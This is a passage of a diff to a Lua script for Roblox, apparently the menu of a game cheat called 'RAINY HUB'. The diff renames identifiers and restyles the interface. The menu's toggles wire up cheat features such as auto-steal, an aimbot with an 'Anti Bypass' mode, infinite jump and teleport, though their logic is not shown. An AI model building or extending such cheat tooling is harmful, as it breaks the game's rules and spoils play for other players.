-AceLockTopButton.Visible = false -- lock button removed from the header
-AceLockTopButton.Parent = Main
-corner(AceLockTopButton, 8)
-stroke(AceLockTopButton, COLORS.stroke, 1, 0.35)
-function AceUpdateGuiLockVisual()
-if AceLockTopButton then
-AceLockTopButton.Text = (_G.AceGuiLocked == true) and "UNLOCK" or "LOCK"
-AceLockTopButton.BackgroundTransparency = (_G.AceGuiLocked == true) and 0.08 or 0.28
-local st = AceLockTopButton:FindFirstChildOfClass("UIStroke")
+Close.ZIndex = 6
+Close.Parent = TopBar
+corner(Close, 7)
+stroke(Close, Color3.fromRGB(255, 255, 255), 1, 0.45)
+DiceLockTopButton = Instance.new("TextButton")
+DiceLockTopButton.Name = "LockGUI"
+DiceLockTopButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+DiceLockTopButton.BackgroundTransparency = 0.28
+DiceLockTopButton.TextColor3 = COLORS.white
+DiceLockTopButton.TextSize = 8
+DiceLockTopButton.Font = Enum.Font.GothamBlack
+DiceLockTopButton.Size = UDim2.new(0, 30, 0, 24)
+DiceLockTopButton.Position = UDim2.new(1, -38, 0.5, 2)
+DiceLockTopButton.AutoButtonColor = false
+DiceLockTopButton.ZIndex = 6
+DiceLockTopButton.Parent = TopBar
+corner(DiceLockTopButton, 7)
+stroke(DiceLockTopButton, COLORS.stroke, 1, 0.35)
+end
+function DiceUpdateGuiLockVisual()
+if DiceLockTopButton then
+DiceLockTopButton.Text = (_G.DiceGuiLocked == true) and "UNLOCK" or "LOCK"
+DiceLockTopButton.BackgroundTransparency = (_G.DiceGuiLocked == true) and 0.08 or 0.28
+local st = DiceLockTopButton:FindFirstChildOfClass("UIStroke")
 if st then
-st.Transparency = (_G.AceGuiLocked == true) and 0.08 or 0.35
-st.Color = (_G.AceGuiLocked == true) and Color3.fromRGB(255,255,255) or COLORS.stroke
+st.Transparency = (_G.DiceGuiLocked == true) and 0.08 or 0.35
+st.Color = (_G.DiceGuiLocked == true) and Color3.fromRGB(255,255,255) or COLORS.stroke
 end
 end
-if setLockGuiVisual then pcall(setLockGuiVisual, _G.AceGuiLocked == true) end
+if setLockGuiVisual then pcall(setLockGuiVisual, _G.DiceGuiLocked == true) end
 end
-AceLockTopButton.Activated:Connect(function()
-_G.AceGuiLocked = not (_G.AceGuiLocked == true)
-AceUpdateGuiLockVisual()
-saveAceConfig()
+DiceLockTopButton.Activated:Connect(function()
+_G.DiceGuiLocked = not (_G.DiceGuiLocked == true)
+DiceUpdateGuiLockVisual()
+saveDiceConfig()
 end)
-AceUpdateGuiLockVisual()
-local Content = Instance.new("Frame")
-Content.Name = "Content"
-Content.BackgroundTransparency = 1
-Content.Position = UDim2.new(0, SIDE_W + 26, 0, 16)
-Content.Size = UDim2.new(1, -(SIDE_W + 40), 1, -32)
-Content.ZIndex = 3
-Content.Parent = Main
-local Tabs = Instance.new("Frame")
+DiceUpdateGuiLockVisual()
+-- ═══════════════════════════════════════════════════════════════
+-- SIDEBAR — narrow navigation rail: a die badge per tab with its
+-- name beside it, and the scrolling content pane alongside
+-- ═══════════════════════════════════════════════════════════════
+do
+local SIDEBAR_WIDTH = 108
+local Sidebar = Instance.new("Frame")
+Sidebar.Name = "Sidebar"
+Sidebar.BackgroundColor3 = Color3.fromRGB(16, 16, 18)
+Sidebar.BackgroundTransparency = 0.34
+Sidebar.BorderSizePixel = 0
+Sidebar.Position = UDim2.new(0, 10, 0, 104)
+Sidebar.Size = UDim2.new(0, SIDEBAR_WIDTH, 1, -114)
+Sidebar.ZIndex = 3
+Sidebar.Parent = Main
+corner(Sidebar, 12)
+stroke(Sidebar, COLORS.strokeSoft, 1, 0.5)
+local NavCaption = Instance.new("TextLabel")
+NavCaption.Name = "NavCaption"
+NavCaption.BackgroundTransparency = 1
+NavCaption.Position = UDim2.new(0, 11, 0, 9)
+NavCaption.Size = UDim2.new(1, -22, 0, 12)
+NavCaption.Text = "NAVIGATION"
+NavCaption.TextColor3 = COLORS.textDim
+NavCaption.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+NavCaption.TextStrokeTransparency = 0.5
+NavCaption.Font = Enum.Font.GothamBold
+NavCaption.TextSize = 8
+NavCaption.TextXAlignment = Enum.TextXAlignment.Left
+NavCaption.ZIndex = 4
+NavCaption.Parent = Sidebar
+Tabs = Instance.new("Frame")
 Tabs.Name = "Tabs"
 Tabs.BackgroundTransparency = 1
-Tabs.Position = UDim2.new(0, 26, 0, 346)
-Tabs.Size = UDim2.new(0, SIDE_W - 28, 0, 170)
-Tabs.ZIndex = 4
-Tabs.Parent = Main
+Tabs.Position = UDim2.new(0, 8, 0, 26)
+Tabs.Size = UDim2.new(1, -16, 1, -60)
+Tabs.ZIndex = 3
+Tabs.Parent = Sidebar
 local TabLayout = Instance.new("UIListLayout")
 TabLayout.FillDirection = Enum.FillDirection.Vertical
-TabLayout.Padding = UDim.new(0, 4)
+TabLayout.Padding = UDim.new(0, 6)
 TabLayout.SortOrder = Enum.SortOrder.LayoutOrder
+TabLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
 TabLayout.Parent = Tabs
+-- Credit strip along the foot of the rail.
+local MadeBy = Instance.new("TextLabel")
+MadeBy.Name = "MadeBy"
+MadeBy.BackgroundTransparency = 1
+MadeBy.AnchorPoint = Vector2.new(0.5, 1)
+MadeBy.Position = UDim2.new(0.5, 0, 1, -10)
+MadeBy.Size = UDim2.new(1, -16, 0, 12)
+MadeBy.Text = "RAINY HUB"
+MadeBy.TextColor3 = COLORS.textDim
+MadeBy.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+MadeBy.TextStrokeTransparency = 0.45
+MadeBy.Font = Enum.Font.GothamBold
+MadeBy.TextSize = 8
+MadeBy.TextXAlignment = Enum.TextXAlignment.Center
+MadeBy.ZIndex = 4
+MadeBy.Parent = Sidebar
+-- Content pane: the rows need a ground of their own, otherwise the
+-- backdrop dice read straight through the gaps between them.
+local ContentPane = Instance.new("Frame")
+ContentPane.Name = "ContentPane"
+ContentPane.BackgroundColor3 = Color3.fromRGB(16, 16, 18)
+ContentPane.BackgroundTransparency = 0.34
+ContentPane.BorderSizePixel = 0
+ContentPane.Position = UDim2.new(0, SIDEBAR_WIDTH + 18, 0, 104)
+ContentPane.Size = UDim2.new(1, -(SIDEBAR_WIDTH + 28), 1, -114)
+ContentPane.ZIndex = 3
+ContentPane.Parent = Main
+corner(ContentPane, 12)
+stroke(ContentPane, COLORS.strokeSoft, 1, 0.5)
+-- Page heading: accent bar, the tab's name, and a die that re-rolls
+-- with it — the panel's answer to the reference's weather glyph.
+local PageAccent = Instance.new("Frame")
+PageAccent.Name = "PageAccent"
+PageAccent.BackgroundColor3 = COLORS.accent
+PageAccent.BackgroundTransparency = 0.15
+PageAccent.BorderSizePixel = 0
+PageAccent.Position = UDim2.new(0, 12, 0, 14)
+PageAccent.Size = UDim2.new(0, 3, 0, 16)
+PageAccent.ZIndex = 6
+PageAccent.Parent = ContentPane
+corner(PageAccent, 2)
+PageTitle = Instance.new("TextLabel")
+PageTitle.Name = "PageTitle"
+PageTitle.BackgroundTransparency = 1
+PageTitle.Position = UDim2.new(0, 22, 0, 13)
+PageTitle.Size = UDim2.new(1, -60, 0, 18)
+PageTitle.Text = "MOVEMENT CONFIGURATION"
+PageTitle.TextColor3 = COLORS.white
+PageTitle.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+PageTitle.TextStrokeTransparency = 0.4
+PageTitle.Font = Enum.Font.GothamBlack
+PageTitle.TextSize = 12
+PageTitle.TextXAlignment = Enum.TextXAlignment.Left
+PageTitle.TextTruncate = Enum.TextTruncate.AtEnd
+PageTitle.ZIndex = 6
+PageTitle.Parent = ContentPane
+local PageDie
+PageDie, setPageDieFace = makeDie(ContentPane, 22, 6, false)
+PageDie.Name = "PageDie"
+PageDie.AnchorPoint = Vector2.new(1, 0)
+PageDie.Position = UDim2.new(1, -12, 0, 11)
+PageDie.Rotation = 10
+local PageDivider = Instance.new("Frame")
+PageDivider.Name = "PageDivider"
+PageDivider.BackgroundColor3 = COLORS.stroke
+PageDivider.BackgroundTransparency = 0.5
+PageDivider.BorderSizePixel = 0
+PageDivider.Position = UDim2.new(0, 12, 0, 40)
+PageDivider.Size = UDim2.new(1, -24, 0, 1)
+PageDivider.ZIndex = 6
+PageDivider.Parent = ContentPane
+Content = Instance.new("Frame")
+Content.Name = "Content"
+Content.BackgroundTransparency = 1
+Content.Position = UDim2.new(0, SIDEBAR_WIDTH + 28, 0, 152)
+Content.Size = UDim2.new(1, -(SIDEBAR_WIDTH + 46), 1, -164)
+Content.ZIndex = 3
+Content.Parent = Main
+end
 local pages = {}
 local tabButtons = {}
 local tabNames = {"MOVEMENT", "COMBAT", "KEYBINDS", "VISUALS", "SETTINGS"}
@@ -4252,9 +5059,9 @@ local page = Instance.new("ScrollingFrame")
 page.Name = name
 page.BackgroundTransparency = 1
 page.BorderSizePixel = 0
-page.ScrollBarThickness = 2
-page.ScrollBarImageColor3 = RAIN.accent
-page.ScrollBarImageTransparency = 0.4
+page.ScrollBarThickness = 3
+page.ScrollBarImageColor3 = Color3.fromRGB(215, 215, 220)
+page.ScrollBarImageTransparency = 0.35
 page.CanvasSize = UDim2.new(0, 0, 0, 0)
 page.AutomaticCanvasSize = Enum.AutomaticSize.Y
 page.Size = UDim2.new(1, 0, 1, 0)
@@ -4273,90 +5080,146 @@ activeTab = name
 for pageName, page in pairs(pages) do
 page.Visible = pageName == name
 end
+if PageTitle then PageTitle.Text = name .. " CONFIGURATION" end
+if setPageDieFace then setPageDieFace(math.random(1, 6)) end
+if rollTitleDice then rollTitleDice() end
+if rollBackdropDice then rollBackdropDice() end
 for tabName, btn in pairs(tabButtons) do
 local on = tabName == name
 btn.TextColor3 = on and COLORS.white or COLORS.textDim
-btn.BackgroundColor3 = on and RAIN.accent or COLORS.row
-btn.BackgroundTransparency = on and 0 or 0.62
-btn.Font = on and Enum.Font.GothamBlack or Enum.Font.GothamSemibold
+tween(btn, {BackgroundTransparency = on and 0.22 or 0.68})
 local st = btn:FindFirstChildOfClass("UIStroke")
 if st then
-st.Transparency = on and 0.1 or 0.62
-st.Color = on and RAIN.accentGlow or COLORS.stroke
+st.Transparency = on and 0.15 or 0.6
+st.Color = on and COLORS.accent or COLORS.stroke
 end
-local glow = btn:FindFirstChild("TabGlow")
-if glow then glow.Visible = on end
+local accent = btn:FindFirstChild("Accent")
+if accent then
+tween(accent, {
+BackgroundTransparency = on and 0 or 1,
+Size = on and UDim2.new(0, 3, 0, 24) or UDim2.new(0, 3, 0, 0)
+})
+end
+local badge = btn:FindFirstChild("Badge")
+if badge then
+tween(badge, {BackgroundTransparency = on and 0.05 or 0.2})
+local bst = badge:FindFirstChildOfClass("UIStroke")
+if bst then
+bst.Color = on and COLORS.accent or COLORS.stroke
+bst.Transparency = on and 0.2 or 0.5
 end
 end
-for _, name in ipairs(tabNames) do
+end
+end
+for i, name in ipairs(tabNames) do
 addPage(name)
 local btn = Instance.new("TextButton")
 btn.Name = name
-btn.Size = UDim2.new(1, 0, 0, 30)
-btn.BackgroundColor3 = COLORS.row
-btn.BackgroundTransparency = 0.62
+btn.Size = UDim2.new(1, 0, 0, 52)
+btn.BackgroundColor3 = Color3.fromRGB(22, 22, 25)
+btn.BackgroundTransparency = 0.68
 btn.BorderSizePixel = 0
 btn.Text = name
 btn.TextColor3 = COLORS.textDim
-btn.TextStrokeColor3 = Color3.fromRGB(0, 6, 22)
-btn.TextStrokeTransparency = 0.55
-btn.TextSize = 13
+btn.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+btn.TextStrokeTransparency = 0.35
+btn.TextSize = 8
+btn.Font = Enum.Font.GothamBlack
 btn.TextXAlignment = Enum.TextXAlignment.Left
-btn.Font = Enum.Font.GothamSemibold
+btn.TextTruncate = Enum.TextTruncate.AtEnd
 btn.AutoButtonColor = false
-btn.ZIndex = 5
+btn.ZIndex = 4
 btn.Parent = Tabs
 corner(btn, 9)
-stroke(btn, COLORS.stroke, 1.1, 0.62)
-do
+stroke(btn, COLORS.stroke, 1, 0.6)
 local pad = Instance.new("UIPadding")
-pad.PaddingLeft = UDim.new(0, 16)
+pad.PaddingLeft = UDim.new(0, 38)
 pad.Parent = btn
-local glow = Instance.new("Frame")
-glow.Name = "TabGlow"
-glow.BackgroundColor3 = RAIN.accentGlow
-glow.BorderSizePixel = 0
-glow.Size = UDim2.new(0, 3, 0, 14)
-glow.Position = UDim2.new(0, -13, 0.5, -7)
-glow.Visible = false
-glow.ZIndex = 6
-glow.Parent = btn
-corner(glow, 2)
-end
+-- Each tab carries its own face, one through five, in a badge tile
+-- the way the reference rail carries two-letter codes.
+local badge = Instance.new("Frame")
+badge.Name = "Badge"
+badge.BackgroundColor3 = COLORS.accentSoft
+badge.BackgroundTransparency = 0.2
+badge.BorderSizePixel = 0
+badge.Position = UDim2.new(0, -30, 0.5, -13)
+badge.Size = UDim2.new(0, 26, 0, 26)
+badge.ZIndex = 5
+badge.Parent = btn
+corner(badge, 8)
+stroke(badge, COLORS.stroke, 1, 0.5)
+local tabDie = makeDie(badge, 16, i, false)
+tabDie.Name = "TabDie"
+tabDie.Position = UDim2.new(0.5, -8, 0.5, -8)
+tabDie.Rotation = (i % 2 == 0) and 7 or -7
+local accent = Instance.new("Frame")
+accent.Name = "Accent"
+accent.BackgroundColor3 = COLORS.accent
+accent.BackgroundTransparency = 1
+accent.BorderSizePixel = 0
+accent.AnchorPoint = Vector2.new(0, 0.5)
+accent.Position = UDim2.new(0, -36, 0.5, 0)
+accent.Size = UDim2.new(0, 3, 0, 0)
+accent.ZIndex = 7
+accent.Parent = btn
+corner(accent, 2)
 tabButtons[name] = btn
 btn.MouseButton1Click:Connect(function()
 setTab(name)
 end)
 end
 function section(parent, text, order)
+local holder = Instance.new("Frame")
+holder.Name = text
+holder.BackgroundTransparency = 1
+holder.Size = UDim2.new(1, -6, 0, 24)
+holder.LayoutOrder = order
+holder.ZIndex = 8
+holder.Parent = parent
 local label = Instance.new("TextLabel")
-label.Name = text
+label.Name = "Label"
 label.BackgroundTransparency = 1
 label.Text = text
-label.TextColor3 = RAIN.accent
-label.TextStrokeColor3 = Color3.fromRGB(0, 6, 22)
-label.TextStrokeTransparency = 0.4
-label.TextSize = 12
+label.TextColor3 = Color3.fromRGB(245, 245, 250)
+label.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+label.TextStrokeTransparency = 0.22
+label.TextSize = 11
 label.Font = Enum.Font.GothamBlack
 label.TextXAlignment = Enum.TextXAlignment.Left
-label.Size = UDim2.new(1, -6, 0, 15)
-label.LayoutOrder = order
+label.Position = UDim2.new(0, 2, 0, 0)
+label.Size = UDim2.new(1, -2, 0, 15)
 label.ZIndex = 8
-label.Parent = parent
-return label
+label.Parent = holder
+local underline = Instance.new("Frame")
+underline.Name = "Underline"
+underline.BackgroundColor3 = COLORS.accent
+underline.BackgroundTransparency = 0.3
+underline.BorderSizePixel = 0
+underline.Size = UDim2.new(1, -2, 0, 1)
+underline.Position = UDim2.new(0, 2, 0, 20)
+underline.ZIndex = 8
+underline.Parent = holder
+local fade = Instance.new("UIGradient")
+fade.Transparency = NumberSequence.new({
+NumberSequenceKeypoint.new(0, 0),
+NumberSequenceKeypoint.new(0.75, 0.5),
+NumberSequenceKeypoint.new(1, 1),
+})
+fade.Parent = underline
+return holder
 end
 function baseRow(parent, labelText, order)
 local row = Instance.new("Frame")
 row.Name = labelText
 row.BackgroundColor3 = COLORS.row
-row.BackgroundTransparency = 0.24
+row.BackgroundTransparency = 0.3
 row.Size = UDim2.new(1, -4, 0, 36)
 row.BorderSizePixel = 0
 row.LayoutOrder = order
 row.ZIndex = 4
 row.Parent = parent
 corner(row, 10)
-stroke(row, COLORS.strokeSoft, 1.15, 0.42)
+stroke(row, COLORS.strokeSoft, 1.15, 0.38)
 local label = Instance.new("TextLabel")
 label.Name = "Label"
 label.BackgroundTransparency = 1
@@ -4367,15 +5230,17 @@ label.TextStrokeTransparency = 0.25
 label.TextSize = 12
 label.Font = Enum.Font.GothamSemibold
 label.TextXAlignment = Enum.TextXAlignment.Left
+label.TextTruncate = Enum.TextTruncate.AtEnd
 label.Position = UDim2.new(0, 12, 0, 0)
-label.Size = UDim2.new(1, -132, 1, 0)
+-- Leaves room for the widest right-hand control (the value pill).
+label.Size = UDim2.new(1, -90, 1, 0)
 label.ZIndex = 5
 label.Parent = row
 row.MouseEnter:Connect(function()
-tween(row, {BackgroundTransparency = 0.12})
+tween(row, {BackgroundTransparency = 0.22})
 end)
 row.MouseLeave:Connect(function()
-tween(row, {BackgroundTransparency = 0.24})
+tween(row, {BackgroundTransparency = 0.3})
 end)
 return row
 end
@@ -4383,19 +5248,19 @@ function textboxRow(parent, labelText, value, order)
 local row = baseRow(parent, labelText, order)
 local box = Instance.new("TextBox")
 box.Name = "ValueBox"
-box.BackgroundColor3 = Color3.fromRGB(8, 8, 12)
+box.BackgroundColor3 = COLORS.accentSoft
 box.BackgroundTransparency = 0.18
 box.Text = tostring(value or "")
 box.TextColor3 = COLORS.white
 box.TextSize = 12
 box.Font = Enum.Font.GothamSemibold
 box.ClearTextOnFocus = false
-box.Size = UDim2.new(0, 58, 0, 24)
-box.Position = UDim2.new(1, -68, 0.5, -12)
+box.Size = UDim2.new(0, 62, 0, 26)
+box.Position = UDim2.new(1, -72, 0.5, -13)
 box.BorderSizePixel = 0
 box.ZIndex = 6
 box.Parent = row
-corner(box, 7)
+corner(box, 8)
 stroke(box, COLORS.strokeSoft, 1, 0.45)
 return row, box
 end
@@ -4445,21 +5310,26 @@ local trackStroke = track:FindFirstChildOfClass("UIStroke")
 local rowStroke = row:FindFirstChildOfClass("UIStroke")
 local function setVisual(on)
 state = on and true or false
-tween(knob, {Position = state and UDim2.new(1, -16, 0.5, -6) or UDim2.new(0, 3, 0.5, -6)})
+tween(knob, {
+Position = state and UDim2.new(1, -16, 0.5, -6) or UDim2.new(0, 3, 0.5, -6),
+-- White track, dark knob when on: the only contrast a monochrome
+-- switch has left once the accent stopped being a colour.
+BackgroundColor3 = state and Color3.fromRGB(16, 16, 18) or COLORS.knob
+})
 tween(track, {
 BackgroundTransparency = state and 0.03 or 0.2,
-BackgroundColor3 = state and RAIN.accent or COLORS.toggleBg
+BackgroundColor3 = state and COLORS.accent or COLORS.toggleBg
 })
 if trackStroke then
 tween(trackStroke, {
-Color = state and RAIN.accentGlow or COLORS.strokeSoft,
+Color = state and COLORS.accent or COLORS.strokeSoft,
 Transparency = state and 0.05 or 0.45,
 Thickness = state and 1.25 or 1
 })
 end
 if rowStroke then
 tween(rowStroke, {
-Color = state and RAIN.accentGlow or COLORS.strokeSoft,
+Color = state and COLORS.accent or COLORS.strokeSoft,
 Transparency = state and 0.12 or 0.38,
 Thickness = state and 1.25 or 1.15
 })
@@ -4471,7 +5341,7 @@ button.Activated:Connect(function()
 end)
 return row, setVisual
 end
-_G.AceSyncToggleVisuals = function()
+_G.DiceSyncToggleVisuals = function()
 pcall(function() if setAutoStealVisual then setAutoStealVisual(autoStealEnabled == true) end end)
 pcall(function() if setInfJumpVisual then setInfJumpVisual(infJumpEnabled == true) end end)
 pcall(function() if setAntiRagdollVisual then setAntiRagdollVisual(antiRagdollEnabled == true) end end)
@@ -4479,7 +5349,7 @@ pcall(function() if setAutoCarrySpeedVisual then setAutoCarrySpeedVisual(autoCar
 pcall(function() if setAutoTPVisual then setAutoTPVisual(autoTPEnabled == true) end end)
 pcall(function() if setAutoResetOnMedVisual then setAutoResetOnMedVisual(autoResetOnMedEnabled == true) end end)
 end
-_G.AceActionToggleRow = function(parent, labelText, default, order)
+_G.DiceActionToggleRow = function(parent, labelText, default, order)
 local row = baseRow(parent, labelText, order)
 local button = Instance.new("TextButton")
 button.Name = "ToggleButton"
@@ -4524,21 +5394,26 @@ local trackStroke = track:FindFirstChildOfClass("UIStroke")
 local rowStroke = row:FindFirstChildOfClass("UIStroke")
 local function setVisual(on)
 local state = on and true or false
-tween(knob, {Position = state and UDim2.new(1, -16, 0.5, -6) or UDim2.new(0, 3, 0.5, -6)})
+tween(knob, {
+Position = state and UDim2.new(1, -16, 0.5, -6) or UDim2.new(0, 3, 0.5, -6),
+-- White track, dark knob when on: the only contrast a monochrome
+-- switch has left once the accent stopped being a colour.
+BackgroundColor3 = state and Color3.fromRGB(16, 16, 18) or COLORS.knob
+})
 tween(track, {
 BackgroundTransparency = state and 0.03 or 0.2,
-BackgroundColor3 = state and RAIN.accent or COLORS.toggleBg
+BackgroundColor3 = state and COLORS.accent or COLORS.toggleBg
 })
 if trackStroke then
 tween(trackStroke, {
-Color = state and RAIN.accentGlow or COLORS.strokeSoft,
+Color = state and COLORS.accent or COLORS.strokeSoft,
 Transparency = state and 0.05 or 0.45,
 Thickness = state and 1.25 or 1
 })
 end
 if rowStroke then
 tween(rowStroke, {
-Color = state and RAIN.accentGlow or COLORS.strokeSoft,
+Color = state and COLORS.accent or COLORS.strokeSoft,
 Transparency = state and 0.12 or 0.38,
 Thickness = state and 1.25 or 1.15
 })
@@ -4552,7 +5427,7 @@ function dropdownRow(parent, labelText, value, order)
 local row = baseRow(parent, labelText, order)
 local select = Instance.new("TextButton")
 select.Name = "Dropdown"
-select.BackgroundColor3 = Color3.fromRGB(8, 8, 12)
+select.BackgroundColor3 = COLORS.accentSoft
 select.BackgroundTransparency = 0.18
 select.Text = tostring(value or "None") .. "  ▼"
 select.TextColor3 = COLORS.white
@@ -4584,7 +5459,7 @@ label.TextSize = 11
 end
 local left = Instance.new("TextButton")
 left.Name = "LeftArrow"
-left.BackgroundColor3 = Color3.fromRGB(8, 8, 12)
+left.BackgroundColor3 = COLORS.accentSoft
 left.BackgroundTransparency = 0.18
 left.Text = "<"
 left.TextColor3 = COLORS.white
@@ -4613,7 +5488,7 @@ animationPackValueLabel.ZIndex = 6
 animationPackValueLabel.Parent = row
 local right = Instance.new("TextButton")
 right.Name = "RightArrow"
-right.BackgroundColor3 = Color3.fromRGB(8, 8, 12)
+right.BackgroundColor3 = COLORS.accentSoft
 right.BackgroundTransparency = 0.18
 right.Text = ">"
 right.TextColor3 = COLORS.white
@@ -4633,7 +5508,7 @@ AnimationPackIndex = nextIndex
 selectedAnimationPack = AnimationPackList[AnimationPackIndex]
 refreshAnimationPackRow()
 applyAnimationPack(selectedAnimationPack)
-if saveAceConfig then pcall(saveAceConfig) end
+if saveDiceConfig then pcall(saveDiceConfig) end
 end
 left.MouseButton1Click:Connect(function()
 setPackIndex(AnimationPackIndex - 1)
@@ -4674,7 +5549,7 @@ function tpDownKeybindRow(parent, order)
 local row = baseRow(parent, "TP Down", order)
 local btn = Instance.new("TextButton")
 btn.Name = "TPDownKeybindButton"
-btn.BackgroundColor3 = Color3.fromRGB(8, 8, 12)
+btn.BackgroundColor3 = COLORS.accentSoft
 btn.BackgroundTransparency = 0.18
 btn.Text = keyName(tpDownKeybind)
 btn.TextColor3 = COLORS.white
@@ -4690,7 +5565,7 @@ corner(btn, 7)
 stroke(btn, COLORS.strokeSoft, 1, 0.45)
 local clearBtn = Instance.new("TextButton")
 clearBtn.Name = "ClearKeybindButton"
-clearBtn.BackgroundColor3 = Color3.fromRGB(8, 8, 12)
+clearBtn.BackgroundColor3 = COLORS.accentSoft
 clearBtn.BackgroundTransparency = 0.18
 clearBtn.Text = "×"
 clearBtn.TextColor3 = COLORS.white
@@ -4719,7 +5594,7 @@ tpDownKeybind = nil
 if tpDownKeybindButton then tpDownKeybindButton.Text = "None" end
 refreshAllSpeedKeybinds()
 refreshTPDownKeybind()
-saveAceConfig()
+saveDiceConfig()
 end)
 return row, btn
 end
@@ -4727,7 +5602,7 @@ function speedKeybindRow(parent, labelText, keyId, order)
 local row = baseRow(parent, labelText, order)
 local btn = Instance.new("TextButton")
 btn.Name = "KeybindButton"
-btn.BackgroundColor3 = Color3.fromRGB(8, 8, 12)
+btn.BackgroundColor3 = COLORS.accentSoft
 btn.BackgroundTransparency = 0.18
 btn.Text = keyName(speedKeybinds[keyId])
 btn.TextColor3 = COLORS.white
@@ -4743,7 +5618,7 @@ corner(btn, 7)
 stroke(btn, COLORS.strokeSoft, 1, 0.45)
 local clearBtn = Instance.new("TextButton")
 clearBtn.Name = "ClearKeybindButton"
-clearBtn.BackgroundColor3 = Color3.fromRGB(8, 8, 12)
+clearBtn.BackgroundColor3 = COLORS.accentSoft
 clearBtn.BackgroundTransparency = 0.18
 clearBtn.Text = "×"
 clearBtn.TextColor3 = COLORS.white
@@ -4772,7 +5647,7 @@ speedKeybinds[keyId] = nil
 if speedKeybindButtons[keyId] then speedKeybindButtons[keyId].Text = "None" end
 refreshAllSpeedKeybinds()
 refreshTPDownKeybind()
-saveAceConfig()
+saveDiceConfig()
 end)
 return row, btn
 end
@@ -4866,21 +5741,18 @@ end
 function aimbotModeButtonRow(parent, order)
 local row, setVisual = toggleRow(parent, tostring(selectedAimbotMode) .. " Aimbot", false, order)
 aimbotButtonLabel = row and row:FindFirstChild("Label")
-_G.AceAimbotSetVisual = setVisual
+_G.DiceAimbotSetVisual = setVisual
 refreshAimbotButtonLabel()
-if _G.AceRefreshAimbotVisual then _G.AceRefreshAimbotVisual() end
-_aceBtn = row and row:FindFirstChild("ToggleButton")
-if _aceBtn then
-_aceBtn.Activated:Connect(function()
-if _G.AceToggleSelectedAimbot then _G.AceToggleSelectedAimbot() end
+if _G.DiceRefreshAimbotVisual then _G.DiceRefreshAimbotVisual() end
+_diceBtn = row and row:FindFirstChild("ToggleButton")
+if _diceBtn then
+_diceBtn.Activated:Connect(function()
+if _G.DiceToggleSelectedAimbot then _G.DiceToggleSelectedAimbot() end
 end)
 end
 return row, setVisual
 end
-_G.AceAimbotSelectorRow = function(parent, order)
--- Rows that carry a second version (Aimbot: Normal/Anti Bypass, Auto
--- Steal: Normal/Semi) start collapsed showing only the active mode. The
--- chevron opens them so the other version can be picked.
+_G.DiceAimbotSelectorRow = function(parent, order)
 local holder = Instance.new("Frame")
 holder.Name = "Aimbot Mode"
 holder.BackgroundColor3 = COLORS.row
@@ -4975,9 +5847,9 @@ mode = "Normal"
 end
 selectedAimbotMode = mode
 refreshAimbotModeLabels()
-if _G.AceRefreshAimbotSpeedBoxes then _G.AceRefreshAimbotSpeedBoxes() end
-if _G.AceRefreshAimbotVisual then _G.AceRefreshAimbotVisual() end
-saveAceConfig()
+if _G.DiceRefreshAimbotSpeedBoxes then _G.DiceRefreshAimbotSpeedBoxes() end
+if _G.DiceRefreshAimbotVisual then _G.DiceRefreshAimbotVisual() end
+saveDiceConfig()
 local onBypass = selectedAimbotMode == "Anti Bypass"
 tween(slide, {
 Position = onBypass and UDim2.new(0.5, -1, 0, 4) or UDim2.new(0, 4, 0, 4)
@@ -5091,17 +5963,17 @@ local function setMode(mode)
 if mode ~= "Semi" then
 mode = "Normal"
 end
-_G.AceStealRadii = _G.AceStealRadii or {Normal = 62, Semi = 9}
-_G.AceStealRadii[selectedStealMode] = tonumber(autoStealRadius) or _G.AceStealRadii[selectedStealMode]
+_G.DiceStealRadii = _G.DiceStealRadii or {Normal = 62, Semi = 9}
+_G.DiceStealRadii[selectedStealMode] = tonumber(autoStealRadius) or _G.DiceStealRadii[selectedStealMode]
 selectedStealMode = mode
-autoStealRadius = _G.AceStealRadii[selectedStealMode] or ((selectedStealMode == "Semi") and 9 or 62)
+autoStealRadius = _G.DiceStealRadii[selectedStealMode] or ((selectedStealMode == "Semi") and 9 or 62)
 if autoStealRadiusBox then
 autoStealRadiusBox.Text = tostring(autoStealRadius)
 end
-saveAceConfig()
-if _G.AceNormalAutoStealSetRadius then _G.AceNormalAutoStealSetRadius(_G.AceStealRadii.Normal or 62) end
-if _G.AceSemiAutoStealSetRadius then _G.AceSemiAutoStealSetRadius(_G.AceStealRadii.Semi or 9) end
-if _G.AceAutoStealSync then _G.AceAutoStealSync() end
+saveDiceConfig()
+if _G.DiceNormalAutoStealSetRadius then _G.DiceNormalAutoStealSetRadius(_G.DiceStealRadii.Normal or 62) end
+if _G.DiceSemiAutoStealSetRadius then _G.DiceSemiAutoStealSetRadius(_G.DiceStealRadii.Semi or 9) end
+if _G.DiceAutoStealSync then _G.DiceAutoStealSync() end
 local onSemi = selectedStealMode == "Semi"
 tween(slide, {
 Position = onSemi and UDim2.new(0.5, -1, 0, 4) or UDim2.new(0, 4, 0, 4)
@@ -5132,15 +6004,15 @@ section(Movement, "AUTO SPEED", -2)
 _, setAutoCarrySpeedVisual = toggleRow(Movement, "Auto Carry Speed", autoCarrySpeedEnabled, -1)
 do
 local row = Movement:FindFirstChild("Auto Carry Speed")
-_aceBtn = row and row:FindFirstChild("ToggleButton")
-if _aceBtn then
-_aceBtn.Activated:Connect(function()
+_diceBtn = row and row:FindFirstChild("ToggleButton")
+if _diceBtn then
+_diceBtn.Activated:Connect(function()
 autoCarrySpeedEnabled = not autoCarrySpeedEnabled
 if autoCarrySpeedEnabled ~= true and _G.AutoCarrySpeed and _G.AutoCarrySpeed.Disable then
 _G.AutoCarrySpeed.Disable()
 end
 if setAutoCarrySpeedVisual then setAutoCarrySpeedVisual(autoCarrySpeedEnabled == true) end
-saveAceConfig()
+saveDiceConfig()
 end)
 end
 end
@@ -5210,50 +6082,70 @@ if v and v >= -500 and v <= 500 then
 autoTPHeight = v
 end
 autoTPHeightBox.Text = tostring(autoTPHeight)
-saveAceConfig()
+saveDiceConfig()
 end)
 section(Movement, "JUMP", 15)
 _, setInfJumpVisual = toggleRow(Movement, "Infinite Jump", infJumpEnabled, 16)
 do
 local row = Movement:FindFirstChild("Infinite Jump")
-_aceBtn = row and row:FindFirstChild("ToggleButton")
-if _aceBtn then
-_aceBtn.Activated:Connect(function()
